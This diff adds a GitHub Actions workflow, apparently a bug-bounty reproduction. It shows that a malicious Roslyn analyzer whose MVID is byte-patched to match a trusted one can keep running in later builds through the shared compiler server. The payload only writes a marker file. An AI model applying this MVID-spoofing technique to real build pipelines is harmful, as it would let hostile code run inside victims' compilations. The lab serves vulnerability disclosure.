@@ -1,0 +1,248 @@
+name: roslyn-analyzer-mvid-cross-build-lab
+
+on:
+  push:
+    branches:
+      - dotnet-bounty-lab-20260921
+    paths:
+      - .github/workflows/roslyn-analyzer-mvid-cross-build-lab.yml
+
+permissions:
+  contents: read
+
+jobs:
+  reproduce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install current .NET 10 SDK
+        uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '10.0.x'
+
+      - name: Create trusted and malicious analyzer fixtures
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/roslyn-mvid-lab /tmp/ROSLYN_POISON_MARKER
+          mkdir -p /tmp/roslyn-mvid-lab/{trusted,malicious,reader,victim,shared}
+
+          cat > /tmp/roslyn-mvid-lab/trusted/CollisionAnalyzer.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <AssemblyName>CollisionAnalyzer</AssemblyName>
+              <RootNamespace>Collision</RootNamespace>
+              <Version>1.0.0</Version>
+              <Deterministic>true</Deterministic>
+              <DebugType>none</DebugType>
+            </PropertyGroup>
+            <ItemGroup>
+              <Reference Include="Microsoft.CodeAnalysis" HintPath="$(MSBuildSDKsPath)/../Roslyn/bincore/Microsoft.CodeAnalysis.dll" Private="false" />
+            </ItemGroup>
+          </Project>
+          EOF
+          cp /tmp/roslyn-mvid-lab/trusted/CollisionAnalyzer.csproj /tmp/roslyn-mvid-lab/malicious/CollisionAnalyzer.csproj
+
+          cat > /tmp/roslyn-mvid-lab/trusted/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+
+          namespace Collision;
+
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB001", "Lab", "Lab", "Lab", DiagnosticSeverity.Info, true);
+
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics =>
+                  ImmutableArray.Create(Rule);
+
+              public override void Initialize(AnalysisContext context)
+              {
+                  context.EnableConcurrentExecution();
+              }
+          }
+          EOF
+
+          cat > /tmp/roslyn-mvid-lab/malicious/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using System.IO;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+
+          namespace Collision;
+
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB001", "Lab", "Lab", "Lab", DiagnosticSeverity.Info, true);
+
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics =>
+                  ImmutableArray.Create(Rule);
+
+              public override void Initialize(AnalysisContext context)
+              {
+                  File.AppendAllText("/tmp/ROSLYN_POISON_MARKER", "MALICIOUS_ANALYZER_EXECUTED\n");
+                  context.EnableConcurrentExecution();
+              }
+          }
+          EOF
+
+          cat > /tmp/roslyn-mvid-lab/reader/MvidReader.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+            </PropertyGroup>
+          </Project>
+          EOF
+          cat > /tmp/roslyn-mvid-lab/reader/Program.cs <<'EOF'
+          using System.Reflection.Metadata;
+          using System.Reflection.PortableExecutable;
+
+          using var stream = File.OpenRead(args[0]);
+          using var pe = new PEReader(stream);
+          var metadata = pe.GetMetadataReader();
+          var module = metadata.GetModuleDefinition();
+          var mvid = metadata.GetGuid(module.Mvid);
+          Console.WriteLine(mvid);
+          Console.WriteLine(Convert.ToHexString(mvid.ToByteArray()));
+          EOF
+
+          dotnet build /tmp/roslyn-mvid-lab/trusted/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/roslyn-mvid-lab/malicious/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/roslyn-mvid-lab/reader/MvidReader.csproj -c Release -v:q
+
+          trusted=/tmp/roslyn-mvid-lab/trusted/bin/Release/net10.0/CollisionAnalyzer.dll
+          malicious=/tmp/roslyn-mvid-lab/malicious/bin/Release/net10.0/CollisionAnalyzer.dll
+          reader=/tmp/roslyn-mvid-lab/reader/bin/Release/net10.0/MvidReader.dll
+
+          cp "$malicious" /tmp/roslyn-mvid-lab/malicious-unpatched.dll
+          trusted_hex=$(dotnet "$reader" "$trusted" | tail -n1)
+          malicious_hex=$(dotnet "$reader" "$malicious" | tail -n1)
+          echo "TRUSTED_MVID_HEX=$trusted_hex"
+          echo "MALICIOUS_ORIGINAL_MVID_HEX=$malicious_hex"
+
+          python3 - "$malicious" "$malicious_hex" "$trusted_hex" <<'PY'
+          from pathlib import Path
+          import sys
+
+          path = Path(sys.argv[1])
+          old = bytes.fromhex(sys.argv[2])
+          new = bytes.fromhex(sys.argv[3])
+          data = bytearray(path.read_bytes())
+          count = data.count(old)
+          print(f"MVID_RAW_MATCH_COUNT={count}")
+          if count != 1:
+              raise SystemExit(f"expected exactly one raw MVID occurrence, got {count}")
+          i = data.index(old)
+          data[i:i+16] = new
+          path.write_bytes(data)
+          PY
+
+          patched_hex=$(dotnet "$reader" "$malicious" | tail -n1)
+          echo "MALICIOUS_PATCHED_MVID_HEX=$patched_hex"
+          test "$patched_hex" = "$trusted_hex"
+          cp "$malicious" /tmp/roslyn-mvid-lab/malicious-patched.dll
+
+          echo "CONTENT_HASHES:"
+          sha256sum "$trusted" /tmp/roslyn-mvid-lab/malicious-patched.dll
+          if cmp -s "$trusted" /tmp/roslyn-mvid-lab/malicious-patched.dll; then
+            echo "FIXTURES_DIFFER=FAIL"
+            exit 1
+          fi
+          echo "FIXTURES_DIFFER=PASS"
+
+      - name: Create victim project
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > /tmp/roslyn-mvid-lab/victim/Victim.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <UseSharedCompilation>true</UseSharedCompilation>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="/tmp/roslyn-mvid-lab/shared/CollisionAnalyzer.dll" />
+            </ItemGroup>
+          </Project>
+          EOF
+          cat > /tmp/roslyn-mvid-lab/victim/Program.cs <<'EOF'
+          Console.WriteLine("victim");
+          EOF
+          dotnet restore /tmp/roslyn-mvid-lab/victim/Victim.csproj -v:q
+
+      - name: Baseline - pristine trusted analyzer cannot create marker
+        shell: bash
+        run: |
+          set -euo pipefail
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          rm -f /tmp/ROSLYN_POISON_MARKER /tmp/roslyn-baseline.log
+          cp /tmp/roslyn-mvid-lab/trusted/bin/Release/net10.0/CollisionAnalyzer.dll /tmp/roslyn-mvid-lab/shared/CollisionAnalyzer.dll
+          export RoslynCommandLineLogFile=/tmp/roslyn-baseline.log
+          dotnet build /tmp/roslyn-mvid-lab/victim/Victim.csproj -c Release -t:Rebuild -p:UseSharedCompilation=true -v:q
+          if test -e /tmp/ROSLYN_POISON_MARKER; then
+            echo "TRUSTED_BASELINE=FAIL"
+            exit 1
+          fi
+          echo "TRUSTED_BASELINE=PASS"
+
+      - name: Control - different MVID prevents stale malicious reuse
+        shell: bash
+        run: |
+          set -euo pipefail
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          rm -f /tmp/ROSLYN_POISON_MARKER /tmp/roslyn-control.log
+          cp /tmp/roslyn-mvid-lab/malicious-unpatched.dll /tmp/roslyn-mvid-lab/shared/CollisionAnalyzer.dll
+          export RoslynCommandLineLogFile=/tmp/roslyn-control.log
+
+          dotnet build /tmp/roslyn-mvid-lab/victim/Victim.csproj -c Release -t:Rebuild -p:UseSharedCompilation=true -v:q
+          test -e /tmp/ROSLYN_POISON_MARKER
+          echo "CONTROL_PRIME_MALICIOUS_EXECUTION=PASS"
+
+          rm -f /tmp/ROSLYN_POISON_MARKER
+          cp /tmp/roslyn-mvid-lab/trusted/bin/Release/net10.0/CollisionAnalyzer.dll /tmp/roslyn-mvid-lab/shared/CollisionAnalyzer.dll
+          dotnet build /tmp/roslyn-mvid-lab/victim/Victim.csproj -c Release -t:Rebuild -p:UseSharedCompilation=true -v:q
+
+          if test -e /tmp/ROSLYN_POISON_MARKER; then
+            echo "CONTROL_MVID_MISMATCH_GUARD=FAIL"
+            exit 1
+          fi
+          echo "CONTROL_MVID_MISMATCH_GUARD=PASS"
+          grep -E "MVID|analyzer assembly|Rejected" /tmp/roslyn-control.log || true
+
+      - name: Attack - matching MVID preserves malicious analyzer into trusted build
+        shell: bash
+        run: |
+          set -euo pipefail
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          rm -f /tmp/ROSLYN_POISON_MARKER /tmp/roslyn-attack.log
+          cp /tmp/roslyn-mvid-lab/malicious-patched.dll /tmp/roslyn-mvid-lab/shared/CollisionAnalyzer.dll
+          export RoslynCommandLineLogFile=/tmp/roslyn-attack.log
+
+          dotnet build /tmp/roslyn-mvid-lab/victim/Victim.csproj -c Release -t:Rebuild -p:UseSharedCompilation=true -v:q
+          test -e /tmp/ROSLYN_POISON_MARKER
+          echo "ATTACK_PRIME_MALICIOUS_EXECUTION=PASS"
+
+          rm -f /tmp/ROSLYN_POISON_MARKER
+          cp /tmp/roslyn-mvid-lab/trusted/bin/Release/net10.0/CollisionAnalyzer.dll /tmp/roslyn-mvid-lab/shared/CollisionAnalyzer.dll
+          dotnet build /tmp/roslyn-mvid-lab/victim/Victim.csproj -c Release -t:Rebuild -p:UseSharedCompilation=true -v:q
+
+          if ! test -e /tmp/ROSLYN_POISON_MARKER; then
+            echo "MVID_COLLISION_CROSS_BUILD_EXECUTION=NOT_REPRODUCED"
+            grep -E "MVID|analyzer assembly|Rejected" /tmp/roslyn-attack.log || true
+            exit 1
+          fi
+          echo "MVID_COLLISION_CROSS_BUILD_EXECUTION=CONFIRMED"
+          echo "MARKER_CONTENT:"
+          cat /tmp/ROSLYN_POISON_MARKER
+          echo "ATTACK_LOG_SECURITY_LINES:"
+          grep -E "MVID|analyzer assembly|Rejected" /tmp/roslyn-attack.log || true
